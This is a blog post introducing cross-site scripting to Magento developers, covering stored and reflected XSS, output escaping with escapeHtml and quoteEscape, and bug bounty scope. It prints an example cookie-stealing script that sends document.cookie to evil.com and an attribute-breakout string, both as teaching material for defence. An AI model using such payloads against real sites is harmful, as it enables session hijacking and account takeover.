---
layout: blog-single
title: An Intro To XSS For Magento Developers
description: In this post, I cover the basics of XSS, specifically as they relate to Magento
date: June 15, 2017
image: /img/blog/magento-xss-intro/magento-xss@2x.jpg
image_alt: Magento XSS
tags: [Magento, Security]
ad: domain-clamp-ad-b.html
---

XSS is an abbreviation which stands for "Cross Site Scripting". It is a classification of cyber-attack which is currently listed as #3 on [the OWASP top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project). In this post, I'll explain, in detail, what XSS is, and outline what you need to know about it, as a Magento developer

<!-- excerpt_separator -->

### The Idea

The idea behind XSS, is that an attacker executes unauthorized malicious scripts in the context of another user's session. I find the name "cross site scripting" a bit misleading as there is not always a "cross site" involved in the attack. Often the malicious scripting is handled inline, rather than via a `<script>` tag referencing an external site ("cross site"). As such, I prefer the name "script injection". However, this type of attack is universally known as XSS, so that's the name I'll use here.

### An Example

Let me give you an example. When an administrator views the dashboard of the admin panel on both Magento 1 and 2, they'll see a listing of search recent search terms.

<img
  class="rounded shadow"
  src="/img/blog/magento-xss-intro/magento2-dashboard-recent-search-terms@1x.jpg"
  srcset="/img/blog/magento-xss-intro/magento2-dashboard-recent-search-terms@1x.jpg 1x, /img/blog/magento-xss-intro/magento2-dashboard-recent-search-terms@2x.jpg 2x"
  alt="A screenshot showing the recent search terms widget in the Magento 2 admin panel dashboard">

This is just a feed of terms typed into the search bar on a Magento site.

What if, as an attacker I executed the following search...

<img
  class="rounded shadow"
  src="/img/blog/magento-xss-intro/magento-xss@1x.jpg"
  srcset="/img/blog/magento-xss-intro/magento-xss@1x.jpg 1x, /img/blog/magento-xss-intro/magento-xss@2x.jpg 2x"
  alt="Magento XSS">

If Magento did nothing to protect against XSS, this would get stored in the database. Then, the next time an administrator logged into the admin panel my search term would be rendered in this feed. 

Again, if Magento took no action to prevent against XSS \<script>document.write('\<img src="http://evil.com/?cookie=' + document.cookie + '">')\</script> would not be rendered as text, but would actually be executed as JavaScript. This script would add an image to the page that would wind up sending a request to evil.com (presumably a site controlled by the attacker) along with the admininstrator's cookie.

Then, the attacker would be able to access the victim's Magento admin panel without any authentication, simply by supplying the administrator cookie with their request.

### What Can Unauthorized Scripts Do

Cookie theft is the classic example of XSS. However, Magento provides a layer of protection against that via its "Use HTTP Only" cookie setting. I have [an entire blog post devoted to that setting]({{ site.baseurl }}{%  link _posts/2017-03-08-magentos-use-http-only-cookie-setting.md %}), but the tl;dr; is that it sets cookies on the browser using [the `HttpOnly` flag](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Secure_and_HttpOnly_cookies), which prevents them from being accessed by scripts. You should use it.

 Still, there are other bad things that attackers can do via XSS. For example, they could use `window.location` to redirect you to a phishing site that poses as an official Magento site and prompts you enter your administrator user name and password. They could also read the referrer URL which will disclose your admin front name and read your admin user name and form key from the document. 
 
Suffice it to say, XSS is still a concern even with cookies set to `HttpOnly` and is something you want to protect against.

### Different Types Of XSS

There are two different classifications of XSS, stored XSS and reflected XSS. The example I've just described is classified as stored XSS, because the content used to carry out the attack has been stored in the database.

Reflected XSS, on the other hand, is XSS that happens as a result of data in the URL request string. For example, what if an attacker could trick you to click on a link with the malicious payload in the URL.

<img
  class="rounded shadow"
  src="/img/blog/magento-xss-intro/reflected-xss@1x.jpg"
  srcset="/img/blog/magento-xss-intro/reflected-xss@1x.jpg 1x, /img/blog/magento-xss-intro/reflected-xss@2x.jpg 2x"
  alt="Magento Reflected XSS">

Without any protection against XSS this malicious script will be executed, and will send your frontend cookie to evil.com. The attacker could then gain access to your account and place fraudlent orders using your saved credit card.

While reflected XSS is not good, stored XSS is typically considered more severe as the attacker does not need to trick the victim into taking a specific action.

### The Solution

There are two solutions for XSS, input validation and output escaping. For example, Magento could look at the search term, see the `<script>` tag any reject is as invalid.

In this example, however, search queries including the string \<script> **are** considered valid queries by Magento. So the next solution is output escaping.

The idea here is to convert the word `<script>` to `&lt;script&gt` before outputing. Then, when rendered by the browser the user will see the word "\<script>" as a string of text and the script will not be executed. This strategy is employed by Magento to protect against both the stored, and reflected examples described earlier.

Input validation and output escaping are not mutually exclusive. You should be doing both.

### How Do We Do This In Magento

Magento provides documentation on output escaping for Magento 2 [here](https://developer.adobe.com/commerce/php/development/security/cross-site-scripting/). When outputting untrusted text, you should use `escapeHtml`. This will use the PHP function `htmlspecialchars` to convert `<` to `&lt;`.

Additionally, when outputting untrusted data in HTML attributes, we need to be careful. For example, the attacker could use the following query to break out of an attribute and execute scripts.

`Shoes" onhover="alert('xss')"`

For HTML attributes you should use `quoteEscape` which will escape both single and double quotes.

### In Scope vs. Out Of Scope XSS

According to [Magento's official bug bounty](https://bugcrowd.com/magento), protecting against XSS by administrators to front end users is out of scope. It is an acknowledged part of the platform that administrators are able to output and have rendered scripts during front end users sessions.

> Cross-Site Scripting (XSS) bugs in the admin interface (URLs containing /admin/) where the code is only executed in front end context but not in admin context are excluded. Merchants are explicitly allowed to use active content when designing their stores, so this is a required feature. The admin XSS capability does not give the administrator any additional powers to do harm beyond what other administrative features already allow

However, administrators should non be able to render and have executed scripts in the context of other administrator users as this could facilitate privilege escalation.

> XSS issues where an administrator with limited access can impact other administration pages are valid.

Additionally, as we've seen in the example of this post, front end users should certainly not be able to execute XSS in the context of admin user sessions.

### Conclusion

I hope this post came in useful for some people. If you have any questions or comments, feel free to drop a note below, or, as always, you can reach me on [Twitter](http://twitter.com/maxpchadwick) as well.
